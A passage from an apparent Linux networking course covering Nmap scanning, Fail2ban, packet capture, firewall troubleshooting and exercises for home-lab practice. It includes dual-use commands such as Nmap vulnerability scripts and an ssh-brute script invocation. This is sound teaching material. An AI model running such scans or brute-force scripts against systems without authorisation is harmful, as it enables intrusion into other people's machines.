sudo firewall-cmd --permanent --add-rich-rule='rule family="ipv4" source address="192.168.1.0/24" accept'

# Reload firewall
sudo firewall-cmd --reload
```


---

## Module 7: Network Security and Monitoring (Day 17)

### 7.1 Network Scanning with Nmap

#### Installing Nmap
```bash
# Install Nmap
sudo apt install nmap

# Check version
nmap --version
```

#### Basic Nmap Scans
```bash
# Scan single host
nmap 192.168.1.100

# Scan multiple hosts
nmap 192.168.1.100 192.168.1.101

# Scan subnet
nmap 192.168.1.0/24

# Scan range
nmap 192.168.1.1-254

# Scan from file
nmap -iL targets.txt

# Fast scan (top 100 ports)
nmap -F 192.168.1.100

# Scan specific ports
nmap -p 22,80,443 192.168.1.100
nmap -p 1-1000 192.168.1.100
nmap -p- 192.168.1.100  # All ports

# TCP SYN scan (default, requires root)
sudo nmap -sS 192.168.1.100

# TCP connect scan
nmap -sT 192.168.1.100

# UDP scan
sudo nmap -sU 192.168.1.100

# Service version detection
nmap -sV 192.168.1.100

# OS detection
sudo nmap -O 192.168.1.100

# Aggressive scan
sudo nmap -A 192.168.1.100

# Ping scan (host discovery)
nmap -sn 192.168.1.0/24

# No ping (assume host is up)
nmap -Pn 192.168.1.100

# Save output
nmap -oN output.txt 192.168.1.100
nmap -oX output.xml 192.168.1.100
nmap -oG output.gnmap 192.168.1.100
```


#### Nmap Scripting Engine (NSE)
```bash
# Run default scripts
nmap -sC 192.168.1.100

# Run specific script
nmap --script=http-title 192.168.1.100

# Run script category
nmap --script=vuln 192.168.1.100

# Multiple scripts
nmap --script=http-enum,http-headers 192.168.1.100

# Update script database
sudo nmap --script-updatedb

# List available scripts
nmap --script-help all
nmap --script-help http-*

# Common useful scripts
nmap --script=banner 192.168.1.100
nmap --script=ssh-brute 192.168.1.100
nmap --script=ftp-anon 192.168.1.100
nmap --script=smb-vuln-* 192.168.1.100
```

### 7.2 Intrusion Detection with Fail2ban

#### Installing Fail2ban
```bash
# Install Fail2ban
sudo apt install fail2ban

# Start and enable
sudo systemctl start fail2ban
sudo systemctl enable fail2ban

# Check status
sudo systemctl status fail2ban
```


#### Fail2ban Configuration
```bash
# Main config: /etc/fail2ban/jail.conf (don't edit)
# Local config: /etc/fail2ban/jail.local (create this)

sudo nano /etc/fail2ban/jail.local

[DEFAULT]
bantime = 3600
findtime = 600
maxretry = 5
destemail = admin@example.com
sendername = Fail2Ban
action = %(action_mwl)s

[sshd]
enabled = true
port = ssh
logpath = /var/log/auth.log
maxretry = 3

[apache-auth]
enabled = true
port = http,https
logpath = /var/log/apache2/error.log

[nginx-http-auth]
enabled = true
port = http,https
logpath = /var/log/nginx/error.log

# Restart Fail2ban
sudo systemctl restart fail2ban
```

#### Fail2ban Management
```bash
# Check status
sudo fail2ban-client status

# Check specific jail
sudo fail2ban-client status sshd

# Unban IP
sudo fail2ban-client set sshd unbanip 192.168.1.100

# Ban IP manually
sudo fail2ban-client set sshd banip 192.168.1.100

# Reload configuration
sudo fail2ban-client reload

# View banned IPs
sudo iptables -L -n | grep DROP
```


### 7.3 Network Traffic Analysis

#### Wireshark (GUI)
```bash
# Install Wireshark
sudo apt install wireshark

# Add user to wireshark group
sudo usermod -aG wireshark $USER

# Launch Wireshark
wireshark

# Common display filters:
# http
# tcp.port == 80
# ip.addr == 192.168.1.100
# tcp.flags.syn == 1
# dns
# icmp
```

#### tshark (CLI Wireshark)
```bash
# Capture on interface
sudo tshark -i eth0

# Capture specific number of packets
sudo tshark -i eth0 -c 100

# Capture and save
sudo tshark -i eth0 -w capture.pcap

# Read from file
tshark -r capture.pcap

# Display filter
tshark -r capture.pcap -Y "http"

# Show specific fields
tshark -r capture.pcap -T fields -e ip.src -e ip.dst -e tcp.port
```

### 7.4 Port Security and Monitoring

#### lsof (List Open Files)
```bash
# Show all network connections
sudo lsof -i

# Show specific port
sudo lsof -i :80

# Show TCP connections
sudo lsof -i TCP

# Show UDP connections
sudo lsof -i UDP

# Show connections by user
sudo lsof -u username

# Show listening ports
sudo lsof -i -sTCP:LISTEN
```


---

## Practical Exercises

### Exercise 1: Network Configuration (Day 11)
1. Configure static IP address on your system
2. Set up custom DNS servers
3. Create a network bridge
4. Test connectivity with ping, traceroute, and mtr
5. Capture and analyze network traffic with tcpdump

### Exercise 2: DNS Setup (Day 12)
1. Configure local DNS resolution in /etc/hosts
2. Set up dnsmasq as local DNS server
3. Test DNS queries with dig, host, and nslookup
4. Implement DNS caching
5. Configure custom DNS records

### Exercise 3: SSH Hardening (Day 13)
1. Generate SSH key pairs (RSA and Ed25519)
2. Set up key-based authentication
3. Disable password authentication
4. Change SSH port
5. Configure SSH tunneling (local and remote)
6. Set up SSH jump host configuration

### Exercise 4: Web Server Deployment (Day 14)
1. Install and configure Apache or Nginx
2. Create multiple virtual hosts
3. Obtain and install SSL certificate with Let's Encrypt
4. Configure HTTPS redirect
5. Set up reverse proxy
6. Implement basic security headers

### Exercise 5: File Sharing (Day 15)
1. Set up Samba server with user authentication
2. Create multiple shares with different permissions
3. Configure NFS server and export directories
4. Mount NFS shares on client
5. Set up secure FTP with vsftpd
6. Test file transfers with different protocols

### Exercise 6: Firewall Configuration (Day 16)
1. Configure iptables rules for web server
2. Set up UFW with custom rules
3. Implement port forwarding
4. Configure rate limiting for SSH
5. Set up logging for dropped packets
6. Test firewall rules

### Exercise 7: Network Security (Day 17)
1. Perform network scan with Nmap
2. Identify open ports and services
3. Set up Fail2ban for SSH protection
4. Capture and analyze HTTP traffic
5. Implement intrusion detection
6. Create security monitoring dashboard


---

## Daily Challenges

### Day 11 Challenge: Network Troubleshooting
Create a network diagnostic script that:
- Tests connectivity to multiple hosts
- Performs DNS lookups
- Traces routes to destinations
- Measures latency and packet loss
- Generates a report with findings

### Day 12 Challenge: DNS Server
Set up a complete DNS solution:
- Local DNS server with dnsmasq
- Custom domain resolution
- DNS caching
- Upstream DNS failover
- Query logging and analysis

### Day 13 Challenge: SSH Bastion Host
Build a secure SSH bastion:
- Key-based authentication only
- Two-factor authentication (optional)
- Session logging
- Restricted user access
- Automated key management

### Day 14 Challenge: High-Availability Web Server
Deploy a production-ready web server:
- Multiple virtual hosts
- SSL/TLS with A+ rating
- Reverse proxy configuration
- Load balancing (if multiple backends)
- Automated certificate renewal
- Security headers and hardening

### Day 15 Challenge: Centralized File Server
Create a multi-protocol file server:
- Samba for Windows clients
- NFS for Linux clients
- SFTP for secure transfers
- User quotas
- Access logging
- Automated backups

### Day 16 Challenge: Network Segmentation
Implement network security:
- Multiple firewall zones
- DMZ configuration
- Port forwarding rules
- Rate limiting
- Geo-blocking (optional)
- Comprehensive logging

### Day 17 Challenge: Security Monitoring System
Build a network security monitor:
- Automated port scanning
- Intrusion detection with Fail2ban
- Traffic analysis
- Anomaly detection
- Alert system
- Daily security reports


---

## Troubleshooting Common Issues

### Network Connectivity Issues
```bash
# Check interface status
ip link show
ip addr show

# Check routing
ip route show

# Test DNS resolution
nslookup google.com
dig google.com

# Check for packet loss
ping -c 100 8.8.8.8

# Trace network path
traceroute google.com
mtr google.com

# Check for firewall blocks
sudo iptables -L -v -n

# Restart networking
sudo systemctl restart networking
sudo systemctl restart NetworkManager
```

### SSH Connection Issues
```bash
# Test SSH connection with verbose output
ssh -vvv user@host

# Check SSH service status
sudo systemctl status sshd

# Verify SSH configuration
sudo sshd -t

# Check SSH logs
sudo tail -f /var/log/auth.log

# Verify key permissions
chmod 700 ~/.ssh
chmod 600 ~/.ssh/id_rsa
chmod 644 ~/.ssh/id_rsa.pub
chmod 600 ~/.ssh/authorized_keys

# Test from different port
ssh -p 2222 user@host
```

### Web Server Issues
```bash
# Check Apache/Nginx status
sudo systemctl status apache2
sudo systemctl status nginx

# Test configuration
sudo apache2ctl configtest
sudo nginx -t

# Check error logs
sudo tail -f /var/log/apache2/error.log
sudo tail -f /var/log/nginx/error.log

# Verify port binding
sudo netstat -tlnp | grep :80
sudo ss -tlnp | grep :80

# Check file permissions
ls -la /var/www/html/

# Test with curl
curl -I http://localhost
curl -k https://localhost
```

### Firewall Issues
```bash
# Check if firewall is blocking
sudo iptables -L -v -n
sudo ufw status verbose
sudo firewall-cmd --list-all

# Temporarily disable firewall (testing only!)
sudo ufw disable
sudo systemctl stop firewalld

# Check logs
sudo tail -f /var/log/syslog | grep UFW
sudo journalctl -u firewalld -f

# Verify rule order
sudo iptables -L --line-numbers
```


---

## Best Practices

### Network Configuration
1. Always use static IPs for servers
2. Document network configuration
3. Use descriptive interface names
4. Implement redundant DNS servers
5. Monitor network performance regularly
6. Keep network diagrams updated

### SSH Security
1. Disable root login
2. Use key-based authentication only
3. Change default port
4. Implement fail2ban
5. Use strong key algorithms (Ed25519)
6. Regularly rotate keys
7. Audit SSH access logs
8. Use SSH certificates for large deployments

### Web Server Security
1. Keep software updated
2. Use HTTPS everywhere
3. Implement security headers
4. Disable directory listing
5. Hide server version
6. Use strong SSL/TLS configuration
7. Implement rate limiting
8. Regular security audits
9. Monitor access logs
10. Use Web Application Firewall (WAF)

### Firewall Management
1. Default deny policy
2. Allow only necessary services
3. Document all rules
4. Regular rule audits
5. Implement logging
6. Test rules before production
7. Use stateful inspection
8. Implement rate limiting
9. Geographic restrictions when needed
10. Regular backup of rules

### File Sharing Security
1. Use encryption (SFTP over FTP)
2. Implement strong authentication
3. Restrict user access
4. Use chroot jails
5. Monitor file access
6. Regular permission audits
7. Implement quotas
8. Log all transfers
9. Regular backups
10. Disable anonymous access

---

## Additional Resources

### Documentation
- [Linux Network Administrator's Guide](https://tldp.org/LDP/nag2/)
- [SSH Mastery](https://mwl.io/nonfiction/tools#ssh)
- [Apache Documentation](https://httpd.apache.org/docs/)
- [Nginx Documentation](https://nginx.org/en/docs/)
- [iptables Tutorial](https://www.frozentux.net/iptables-tutorial/iptables-tutorial.html)

### Tools
- [Nmap](https://nmap.org/) - Network scanner
- [Wireshark](https://www.wireshark.org/) - Network protocol analyzer
- [tcpdump](https://www.tcpdump.org/) - Packet analyzer
- [mtr](https://www.bitwizard.nl/mtr/) - Network diagnostic tool
- [Fail2ban](https://www.fail2ban.org/) - Intrusion prevention

### Books
- "TCP/IP Illustrated" by W. Richard Stevens
- "SSH Mastery" by Michael W. Lucas
- "Nginx HTTP Server" by Martin Fjordvald
- "Linux Firewalls" by Steve Suehring

### Online Learning
- [Cisco Networking Academy](https://www.netacad.com/)
- [Professor Messer Network+](https://www.professormesser.com/)
- [Cybrary Networking Courses](https://www.cybrary.it/)

---

## Summary and Next Steps

After completing this Networking and Services module, you should be proficient in:

✓ Understanding network fundamentals and TCP/IP
✓ Configuring network interfaces and routing
✓ Managing DNS and name resolution
✓ Securing and managing SSH services
✓ Deploying and securing web servers (Apache/Nginx)
✓ Setting up file sharing services (Samba/NFS/FTP)
✓ Configuring firewalls (iptables/UFW/firewalld)
✓ Performing network security monitoring
✓ Using network diagnostic and analysis tools
✓ Implementing security best practices

**Next Module**: Proceed to **Day 18-22: Security Hardening** where you'll learn about system hardening, security auditing, intrusion detection, and advanced security configurations.

**Certification Path**: Consider pursuing:
- CompTIA Network+
- CompTIA Security+
- Cisco CCNA
- Linux Professional Institute LPIC-2

**Real-World Projects**:
1. Build a home lab network with multiple services
2. Deploy a secure web application
3. Create a network monitoring dashboard
4. Implement a VPN server
5. Set up a reverse proxy with load balancing

Keep practicing these skills in isolated lab environments and gradually increase complexity. Network security is fundamental to cybersecurity, so master these concepts thoroughly!
